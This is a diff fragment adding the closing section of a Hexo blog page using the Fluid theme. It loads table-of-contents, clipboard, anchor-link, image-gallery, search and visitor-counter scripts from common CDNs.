+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
